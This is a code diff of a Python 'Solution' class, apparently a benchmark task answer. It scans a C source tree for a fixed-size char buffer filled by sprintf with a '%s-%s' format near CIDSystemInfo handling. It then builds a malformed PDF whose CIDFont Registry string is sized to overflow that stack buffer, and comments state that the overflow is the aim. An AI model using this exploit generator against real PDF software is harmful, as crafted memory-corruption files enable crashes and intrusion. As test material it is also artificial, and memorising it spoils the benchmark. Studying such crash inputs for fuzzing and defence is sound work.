@@ -1,220 +1,173 @@
-import io
 import os
 import re
 import tarfile
-from typing import Dict, List, Optional, Tuple
+from typing import List, Optional
 
 
 class Solution:
-    def _extract_defines(self, tf: tarfile.TarFile) -> Dict[str, int]:
-        defines: Dict[str, int] = {}
-        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\b', re.MULTILINE)
-        for m in tf.getmembers():
-            if not m.isfile():
-                continue
-            name = m.name.lower()
-            if not (name.endswith((".h", ".hh", ".hpp", ".c", ".cc", ".cpp"))):
-                continue
-            if m.size <= 0 or m.size > 5 * 1024 * 1024:
-                continue
-            f = tf.extractfile(m)
-            if f is None:
-                continue
-            try:
-                data = f.read()
-            finally:
-                f.close()
-            if b"#define" not in data:
-                continue
-            txt = data.decode("utf-8", "ignore")
-            for mm in define_re.finditer(txt):
-                k = mm.group(1)
-                v = int(mm.group(2))
-                if k not in defines:
-                    defines[k] = v
-        return defines
-
-    def _find_bufsize(self, src_path: str) -> Optional[int]:
-        try:
-            tf = tarfile.open(src_path, "r:*")
-        except Exception:
-            return None
-
-        try:
-            defines = self._extract_defines(tf)
-
-            sprintf_re = re.compile(
-                r'\b(?:s?printf|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"[^"]*%s-%s[^"]*"',
-                re.MULTILINE,
-            )
-            decl_re_template = r'\bchar\s+{var}\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]'
-            candidates: List[Tuple[int, int, str]] = []
-
-            for m in tf.getmembers():
-                if not m.isfile():
-                    continue
-                lname = m.name.lower()
-                if not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hh", ".hpp"))):
-                    continue
-                if m.size <= 0 or m.size > 6 * 1024 * 1024:
-                    continue
-                f = tf.extractfile(m)
-                if f is None:
-                    continue
-                try:
-                    data = f.read()
-                finally:
-                    f.close()
-
-                if b"%s-%s" not in data:
-                    continue
-
-                txt = data.decode("utf-8", "ignore")
-                if "%s-%s" not in txt:
-                    continue
-
-                for mm in sprintf_re.finditer(txt):
-                    var = mm.group(1)
-                    start = mm.start()
-                    before_start = max(0, start - 4000)
-                    before = txt[before_start:start]
-                    after = txt[start:min(len(txt), start + 400)]
-
-                    decl_re = re.compile(decl_re_template.format(var=re.escape(var)))
-                    dim_token = None
-                    for dm in decl_re.finditer(before):
-                        dim_token = dm.group(1)
-
-                    if dim_token is None:
-                        continue
-
-                    if dim_token.isdigit():
-                        size = int(dim_token)
-                    else:
-                        size = defines.get(dim_token)
-                        if size is None:
-                            continue
-
-                    if size <= 0 or size > 2_000_000:
-                        continue
-
-                    snippet = (before[-1500:] + after).lower()
-                    rel = 0
-                    if "cidsysteminfo" in snippet:
-                        rel += 4
-                    if "registry" in snippet:
-                        rel += 3
-                    if "ordering" in snippet:
-                        rel += 3
-                    vlow = var.lower()
-                    if any(k in vlow for k in ("ros", "cid", "coll", "collect", "fallback", "name", "buf", "tmp")):
-                        rel += 2
-                    if any(k in lname for k in ("cid", "font", "pdf", "cmap", "ps", "type0")):
-                        rel += 2
-
-                    candidates.append((rel, size, m.name))
-
-            if not candidates:
-                return None
-
-            max_rel = max(r for r, _, _ in candidates)
-            best_sizes = [s for r, s, _ in candidates if r == max_rel]
-            if not best_sizes:
-                return None
-            return max(best_sizes)
-        finally:
-            try:
-                tf.close()
-            except Exception:
-                pass
-
-    def _build_pdf(self, registry_len: int, ordering_len: int) -> bytes:
-        reg = b"A" * registry_len
-        ordv = b"B" * ordering_len
-
-        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
-
-        objs: List[Tuple[int, bytes]] = []
-
-        objs.append((1, b"<< /Type /Catalog /Pages 2 0 R >>\n"))
-        objs.append((2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"))
-
-        # Page
-        objs.append(
-            (
-                3,
-                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
-                b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>\n",
-            )
-        )
-
-        stream_data = b"BT /F1 12 Tf 72 720 Td <0001> Tj ET\n"
-        stream_obj = b"<< /Length " + str(len(stream_data)).encode("ascii") + b" >>\nstream\n" + stream_data + b"endstream\n"
-        objs.append((4, stream_obj))
-
-        objs.append(
-            (
-                5,
-                b"<< /Type /Font /Subtype /Type0 /BaseFont /Foo /Encoding /Identity-H "
-                b"/DescendantFonts [6 0 R] >>\n",
-            )
-        )
-
-        cid_sys_info = b"<< /Registry (" + reg + b") /Ordering (" + ordv + b") /Supplement 0 >>"
-        cidfont = (
-            b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont /Foo "
-            b"/CIDSystemInfo "
-            + cid_sys_info
-            + b" /FontDescriptor 7 0 R /CIDToGIDMap /Identity /DW 1000 /W [0 [1000]] >>\n"
-        )
-        objs.append((6, cidfont))
-
-        fontdesc = (
-            b"<< /Type /FontDescriptor /FontName /Foo /Flags 4 "
-            b"/FontBBox [0 0 0 0] /ItalicAngle 0 /Ascent 0 /Descent 0 "
-            b"/CapHeight 0 /StemV 0 >>\n"
-        )
-        objs.append((7, fontdesc))
-
-        buf = bytearray()
-        buf.extend(header)
-        offsets: Dict[int, int] = {}
-
-        for objnum, content in objs:
-            offsets[objnum] = len(buf)
-            buf.extend(str(objnum).encode("ascii"))
-            buf.extend(b" 0 obj\n")
-            buf.extend(content)
-            if not content.endswith(b"\n"):
-                buf.extend(b"\n")
-            buf.extend(b"endobj\n")
-
-        xref_pos = len(buf)
-        buf.extend(b"xref\n")
-        size = 8
-        buf.extend(b"0 " + str(size).encode("ascii") + b"\n")
-        buf.extend(b"0000000000 65535 f \n")
-        for i in range(1, size):
-            off = offsets.get(i, 0)
-            buf.extend(f"{off:010d} 00000 n \n".encode("ascii"))
-
-        buf.extend(b"trailer\n")
-        buf.extend(b"<< /Size 8 /Root 1 0 R >>\n")
-        buf.extend(b"startxref\n")
-        buf.extend(str(xref_pos).encode("ascii") + b"\n")
-        buf.extend(b"%%EOF\n")
-        return bytes(buf)
-
     def solve(self, src_path: str) -> bytes:
-        bufsize = self._find_bufsize(src_path)
+        bufsize = self._find_confident_stack_bufsize(src_path)
+        ordering = "Identity"
 
-        if bufsize is None or bufsize <= 0:
-            # Ground-truth-like safe oversize
-            reg_len = 40000
-            ord_len = 40000
+        if bufsize is None:
+            reg_len = 70000
         else:
-            # Minimal overflow: registry alone can overflow many concat patterns; add short ordering.
-            reg_len = max(1, bufsize)
-            ord_len = 2
+            # Ensure overflow even considering '-', ordering, and NUL terminator.
+            # Add extra slack to survive minor parsing differences.
+            reg_len = max(1, bufsize + 1024)
 
-        return self._build_pdf(reg_len, ord_len)
+        registry = "A" * reg_len
+        return self._build_pdf_cidfont_overflow(registry, ordering)
+
+    def _build_pdf_cidfont_overflow(self, registry: str, ordering: str) -> bytes:
+        header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
+
+        reg_b = registry.encode("ascii", "ignore")
+        ord_b = ordering.encode("ascii", "ignore")
+
+        content = b"BT /F1 12 Tf 50 150 Td (X) Tj ET\n"
+        obj5 = b"<< /Length %d >>\nstream\n%sendstream" % (len(content), content)
+
+        cid_sys = b"<< /Registry (%s) /Ordering (%s) /Supplement 0 >>" % (reg_b, ord_b)
+
+        # Intentionally omit BaseFont in Type0 and CIDFont to encourage fallback name creation
+        # from CIDSystemInfo (Registry-Ordering).
+        objects = {
+            1: b"<< /Type /Catalog /Pages 2 0 R >>",
+            2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+            3: b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 200 200] /Contents 5 0 R >>",
+            4: b"<< /Type /Font /Subtype /Type0 /Encoding /Identity-H /DescendantFonts [6 0 R] >>",
+            5: obj5,
+            6: b"<< /Type /Font /Subtype /CIDFontType2 /CIDSystemInfo %s /FontDescriptor 7 0 R /CIDToGIDMap /Identity /DW 1000 /W [0 [1000]] >>"
+               % cid_sys,
+            7: b"<< /Type /FontDescriptor /FontName /DummyCIDFont /Flags 32 /FontBBox [0 0 1000 1000] "
+               b"/ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 1000 /StemV 80 >>",
+        }
+
+        max_obj = max(objects.keys())
+        parts: List[bytes] = [header]
+        offsets = [0] * (max_obj + 1)
+
+        for i in range(1, max_obj + 1):
+            offsets[i] = sum(len(p) for p in parts)
+            body = objects[i]
+            parts.append(b"%d 0 obj\n" % i)
+            parts.append(body)
+            parts.append(b"\nendobj\n")
+
+        xref_off = sum(len(p) for p in parts)
+        parts.append(b"xref\n")
+        parts.append(b"0 %d\n" % (max_obj + 1))
+        parts.append(b"0000000000 65535 f \n")
+        for i in range(1, max_obj + 1):
+            parts.append(b"%010d 00000 n \n" % offsets[i])
+
+        parts.append(b"trailer\n")
+        parts.append(b"<< /Size %d /Root 1 0 R >>\n" % (max_obj + 1))
+        parts.append(b"startxref\n")
+        parts.append(b"%d\n" % xref_off)
+        parts.append(b"%%EOF\n")
+
+        return b"".join(parts)
+
+    def _find_confident_stack_bufsize(self, src_path: str) -> Optional[int]:
+        texts = []
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    if not self._is_code_file(fn):
+                        continue
+                    p = os.path.join(root, fn)
+                    try:
+                        if os.path.getsize(p) > 2_000_000:
+                            continue
+                        with open(p, "rb") as f:
+                            data = f.read()
+                    except Exception:
+                        continue
+                    texts.append(data)
+        else:
+            try:
+                with tarfile.open(src_path, "r:*") as tf:
+                    for m in tf.getmembers():
+                        if not m.isfile():
+                            continue
+                        name = m.name.rsplit("/", 1)[-1]
+                        if not self._is_code_file(name):
+                            continue
+                        if m.size <= 0 or m.size > 2_000_000:
+                            continue
+                        try:
+                            f = tf.extractfile(m)
+                            if f is None:
+                                continue
+                            data = f.read()
+                        except Exception:
+                            continue
+                        texts.append(data)
+            except Exception:
+                return None
+
+        # Strong indicator: CIDSystemInfo + Registry + Ordering + a "%s-%s" format nearby.
+        buf_sizes: List[int] = []
+        fmt_pat = re.compile(r'"[^"\n\r]*%s[^"\n\r]*-[^"\n\r]*%s[^"\n\r]*"')
+        sprintf_var_pat = re.compile(r'\b(?:sprintf|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*(".*?")', re.S)
+        decl_pat_template = r'\bchar\s+%s\s*\[\s*(\d+)\s*\]'
+        generic_decl_pat = re.compile(r'\bchar\s+[A-Za-z_]\w*\s*\[\s*(\d+)\s*\]')
+
+        for blob in texts:
+            try:
+                s = blob.decode("utf-8", "ignore")
+            except Exception:
+                continue
+            if "CIDSystemInfo" not in s or "Registry" not in s or "Ordering" not in s:
+                continue
+            if "%s" not in s or "-" not in s:
+                continue
+
+            for m in fmt_pat.finditer(s):
+                pos = m.start()
+                win_start = max(0, pos - 4000)
+                win_end = min(len(s), pos + 2000)
+                w = s[win_start:win_end]
+
+                # Prefer extracting the specific destination buffer of sprintf/vsprintf call
+                # associated with that format string.
+                best_local: Optional[int] = None
+                for sm in sprintf_var_pat.finditer(w):
+                    fmt = sm.group(2)
+                    if "%s" not in fmt or "-" not in fmt:
+                        continue
+                    var = sm.group(1)
+                    decl_pat = re.compile(decl_pat_template % re.escape(var))
+                    dm = decl_pat.search(w[:sm.start()])
+                    if dm:
+                        try:
+                            n = int(dm.group(1))
+                            if 8 <= n <= 2_000_000:
+                                best_local = n
+                        except Exception:
+                            pass
+
+                if best_local is None:
+                    # Fallback: nearest char[] size before the format string in the window.
+                    sub = w[: (pos - win_start)]
+                    candidates = list(generic_decl_pat.finditer(sub))
+                    if candidates:
+                        try:
+                            n = int(candidates[-1].group(1))
+                            if 8 <= n <= 2_000_000:
+                                best_local = n
+                        except Exception:
+                            pass
+
+                if best_local is not None:
+                    buf_sizes.append(best_local)
+
+        if not buf_sizes:
+            return None
+        return max(buf_sizes)
+
+    def _is_code_file(self, name: str) -> bool:
+        lower = name.lower()
+        return lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"))
